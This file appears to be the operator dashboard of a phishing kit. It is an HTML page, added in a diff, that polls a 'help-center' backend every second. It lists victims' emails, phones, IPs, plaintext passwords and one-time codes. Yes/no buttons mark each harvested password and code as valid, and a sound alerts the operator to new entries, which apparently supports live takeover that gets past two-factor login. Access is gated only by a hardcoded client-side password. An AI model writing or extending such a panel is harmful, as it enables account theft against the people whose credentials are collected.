@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>User Submissions</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="bg-gray-100 min-h-screen p-10 font-sans text-lg">
+    <!-- Edit Note Modal -->
+    <div
+      id="noteModal"
+      class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50"
+    >
+      <div class="bg-white rounded-lg p-6 w-80 shadow">
+        <h2 class="text-lg font-semibold mb-4">Edit Note</h2>
+        <textarea
+          id="noteModalTextarea"
+          class="w-full border px-2 py-1 text-sm rounded resize-none"
+          rows="4"
+        ></textarea>
+        <div class="mt-4 flex justify-end gap-2">
+          <button
+            onclick="closeNoteModal()"
+            class="px-4 py-1 text-sm rounded bg-gray-300"
+          >
+            Cancel
+          </button>
+          <button
+            onclick="saveNoteModal()"
+            class="px-4 py-1 text-sm rounded bg-blue-600 text-white"
+          >
+            Save
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <audio id="newUserSound" src="sound.wav" preload="auto"></audio>
+
+    <div class="w-full px-8 mx-auto">
+      <h1 class="text-2xl font-bold mb-4">User Info</h1>
+
+      <!-- Password Login -->
+      <div id="loginSection" class="bg-white p-4 rounded shadow max-w-md">
+        <p class="mb-2 text-sm text-gray-600">Enter password to view data:</p>
+        <input
+          id="adminPassword"
+          type="password"
+          placeholder="Enter admin password"
+          class="border rounded px-3 py-2 w-full text-sm mb-1"
+        />
+        <p id="errorText" class="text-red-500 text-sm mt-1 hidden">
+          Wrong password
+        </p>
+        <button
+          onclick="login()"
+          class="bg-blue-600 text-white px-4 py-2 rounded text-sm mt-3"
+        >
+          Login
+        </button>
+      </div>
+
+      <!-- Data Table -->
+      <div
+        id="dataSection"
+        class="hidden mt-10 bg-white rounded shadow p-6 overflow-auto w-full"
+      >
+        <table class="min-w-full text-sm text-left">
+          <thead>
+            <tr class="border-b">
+              <th class="px-2 py-1">Personal Email</th>
+              <th class="px-2 py-1">Phone</th>
+              <th class="px-2 py-1">IP</th>
+              <th class="px-2 py-1">Country</th>
+              <th class="px-2 py-1">Password</th>
+              <th class="px-2 py-1">Code</th>
+              <th class="px-2 py-1">Time</th>
+              <th class="px-2 py-1 min-w-[100px]">Check Password</th>
+              <th class="px-2 py-1 min-w-[100px]">Check Code</th>
+              <th class="px-2 py-1 min-w-[100px]">Note</th>
+              <th class="px-2 py-1">Action</th>
+            </tr>
+          </thead>
+          <tbody id="userTableBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <script>
+      const ADMIN_PASS = "admin123";
+      const url = "https://help-center-be.vercel.app";
+      // const url = "http://localhost:3000";
+
+      let knownUsers = new Set();
+
+      function login() {
+        const inputPass = document.getElementById("adminPassword").value.trim();
+        const errorText = document.getElementById("errorText");
+
+        if (inputPass === ADMIN_PASS) {
+          errorText.classList.add("hidden");
+          document.getElementById("loginSection").classList.add("hidden");
+          document.getElementById("dataSection").classList.remove("hidden");
+          fetchAndRenderUsers();
+          setInterval(fetchAndRenderUsers, 1000);
+        } else {
+          errorText.classList.remove("hidden");
+        }
+      }
+
+      function playNotificationSound() {
+        const audio = document.getElementById("newUserSound");
+        if (audio) {
+          audio.play().catch((e) => {
+            console.warn("Audio play failed:", e);
+          });
+        }
+      }
+
+      function fetchAndRenderUsers() {
+        fetch(`${url}/user`)
+          .then((res) => res.json())
+          .then((data) => {
+            const tbody = document.getElementById("userTableBody");
+            tbody.innerHTML = "";
+
+            const currentUsers = new Set();
+            let newUserDetected = false;
+
+            data.forEach((user) => {
+              const userId = user.pemail || user.phone;
+              currentUsers.add(userId);
+
+              if (!knownUsers.has(userId)) {
+                newUserDetected = true;
+              }
+
+              const checkPasswordHtml =
+                user.status === "true"
+                  ? `<span class="text-green-600">true</span>`
+                  : user.isShow === "true"
+                  ? `
+                    <button onclick="handleCheck('${user.pemail}', true)" class="bg-green-500 text-white px-2 py-1 rounded mr-1">Yes</button>
+                    <button onclick="handleCheck('${user.pemail}', false)" class="bg-red-500 text-white px-2 py-1 rounded">No</button>
+                  `
+                  : "";
+
+              const checkCodeHtml =
+                user.codeStatus === "true"
+                  ? `<span class="text-green-600">true</span>`
+                  : user.isCodeShow === "true"
+                  ? `
+                    <button onclick="handleCodeCheck('${user.pemail}', true)" class="bg-green-500 text-white px-2 py-1 rounded mr-1">Yes</button>
+                    <button onclick="handleCodeCheck('${user.pemail}', false)" class="bg-red-500 text-white px-2 py-1 rounded">No</button>
+                  `
+                  : "";
+
+              const tr = document.createElement("tr");
+              const safePemail = encodeURIComponent(user.pemail || "");
+              const noteValue = user.note || "";
+
+              tr.innerHTML = `
+              <td class="px-2 py-1">${user.pemail || "-"}</td>
+              <td class="px-2 py-1">${user.phone || "-"}</td>
+              <td class="px-2 py-1">${user.ip || "-"}</td>
+              <td class="px-2 py-1">${user.country || "-"}</td>
+              <td class="px-2 py-1">${user.password || "-"}</td>
+              <td class="px-2 py-1">${user.code || "-"}</td>
+              <td class="px-2 py-1">${
+                new Date(user.submittedAt).toLocaleString() || "-"
+              }</td>
+              <td class="px-2 py-1">${checkPasswordHtml}</td>
+              <td class="px-2 py-1">${checkCodeHtml}</td>
+              <td class="px-2 py-1 text-sm text-gray-800" id="note-${safePemail}">
+                ${noteValue}
+              </td>
+              <td class="px-2 py-1">
+                <button
+                  onclick="openNoteModal('${safePemail}', \`${noteValue.replace(
+                /`/g,
+                "\\`"
+              )}\`)"
+                  class="bg-blue-500 hover:bg-blue-600 text-white text-xs px-3 py-1 rounded transition"
+                >
+                  Edit
+                </button>
+              </td>
+
+            `;
+
+              tbody.appendChild(tr);
+            });
+
+            if (newUserDetected) {
+              playNotificationSound();
+            }
+
+            knownUsers = currentUsers;
+          });
+        // .catch(() => alert("❌ Failed to load user data"));
+      }
+
+      let editingPemail = "";
+
+      function openNoteModal(pemail, currentNote) {
+        editingPemail = pemail;
+        document.getElementById("noteModalTextarea").value = currentNote;
+        document.getElementById("noteModal").classList.remove("hidden");
+      }
+
+      function closeNoteModal() {
+        editingPemail = "";
+        document.getElementById("noteModalTextarea").value = "";
+        document.getElementById("noteModal").classList.add("hidden");
+      }
+
+      function saveNoteModal() {
+        const textarea = document.getElementById("noteModalTextarea");
+        const newNote = textarea.value.trim();
+
+        fetch(`${url}/user/note`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            pemail: decodeURIComponent(editingPemail),
+            note: newNote,
+          }),
+        })
+          .then((res) => res.json())
+          .then(() => {
+            document.getElementById(`note-${editingPemail}`).innerText =
+              newNote;
+            closeNoteModal();
+          })
+          .catch(() => {
+            // alert("❌ Failed to save note");
+          });
+      }
+
+      function handleCheck(pemail, isYes) {
+        fetch(`${url}/user/status`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ pemail, isYes }),
+        })
+          .then((res) => res.json())
+          .then(() => {
+            // alert("✅ Password status updated");
+            fetchAndRenderUsers();
+          });
+        // .catch(() => alert("❌ Failed to update password status"));
+      }
+
+      function handleCodeCheck(pemail, isYes) {
+        fetch(`${url}/user/codeStatus`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ pemail, isYes }),
+        })
+          .then((res) => res.json())
+          .then(() => {
+            // alert("✅ Code status updated");
+            fetchAndRenderUsers();
+          });
+        // .catch(() => alert("❌ Failed to update code status"));
+      }
+    </script>
+  </body>
+</html>
